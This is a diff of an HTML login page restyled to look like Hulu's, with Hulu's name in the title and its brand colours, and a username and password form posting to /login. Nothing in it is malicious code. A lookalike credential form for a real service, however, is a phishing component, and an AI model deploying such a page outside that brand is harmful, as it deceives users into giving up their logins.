@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Log In</title> 
+  <title>Hulu | Log In</title> 
   <style>
     body {
-      font-family: Arial, sans-serif; 
+      font-family: Arial, sans-serif;
       background-color: #000; /* Hulu background */
       color: white;
       margin: 0;
@@ -17,51 +17,52 @@
     }
 
     .login-container {
-      background-color: rgba(0, 0, 0, 0.8); /* Slightly transparent black */
+      background-color: rgba(0, 0, 0, 0.8); 
       padding: 50px;
-      border-radius: 5px; 
+      border-radius: 8px; /* Slightly more rounded corners */
+      max-width: 400px; /* Limit container width for better layout */
     }
 
     h1 {
       text-align: center;
       color: #1ce783; /* Hulu green */
-      font-size: 2.2em;
-      margin-bottom: 25px;
+      font-size: 2.5em; /* Larger, bolder font */
+      margin-bottom: 30px;
     }
 
     label {
       display: block;
-      margin-bottom: 5px;
-      font-weight: bold; /* Hulu labels are bold */
+      margin-bottom: 8px;  /* More space between label and input */
+      font-weight: bold;
     }
 
     input[type="text"],
     input[type="password"] {
-      width: 100%;
+      width: calc(100% - 24px); /* Full width with padding */
       padding: 12px;
-      margin-bottom: 15px;
-      border: 1px solid #333; /* Subtle border */
-      background-color: #181818; /* Darker background for inputs */
+      margin-bottom: 20px;
+      border: 1px solid #333;
+      background-color: #111; /* Darker input background */
       color: white;
-      border-radius: 3px; 
+      border-radius: 4px;
+      font-size: 1em; /* Larger input font */
     }
 
-    .submit-button { /* Style for the centered Submit button */
-      background-color: #1ce783; /* Hulu green */
-      color: black; 
-      padding: 12px 18px;
+    .submit-button {
+      background-color: #1ce783; 
+      color: black;
+      padding: 14px 24px; /* Larger padding for a bolder look */
       border: none;
-      border-radius: 3px;
+      border-radius: 25px; /* Pill-shaped button */
       cursor: pointer;
       width: 100%;
       font-weight: bold;
-      font-size: 1em;
-      display: block; /* Occupy full width */
-      margin: 20px auto; /* Center horizontally */
+      font-size: 1.1em;
+      transition: background-color 0.3s ease; /* Smooth transition */
     }
 
     .submit-button:hover {
-      background-color: #16bd6d; /* Slightly darker green on hover */
+      background-color: #16bd6d; 
     }
   </style>
 </head>
@@ -70,5 +71,11 @@
     <h1>Log In</h1>
     <form action="/login" method="post">
       <label for="username">Username</label> 
-      <input type="text" id="username" name="username" required><br><br>
+      <input type="text" id="username" name="username" required><br>
       <label for="password">Password</label>
+      <input type="password" id="password" name="password" required><br>
+      <input type="submit" value="Submit" class="submit-button"> 
+    </form>
+  </div>
+</body>
+</html>
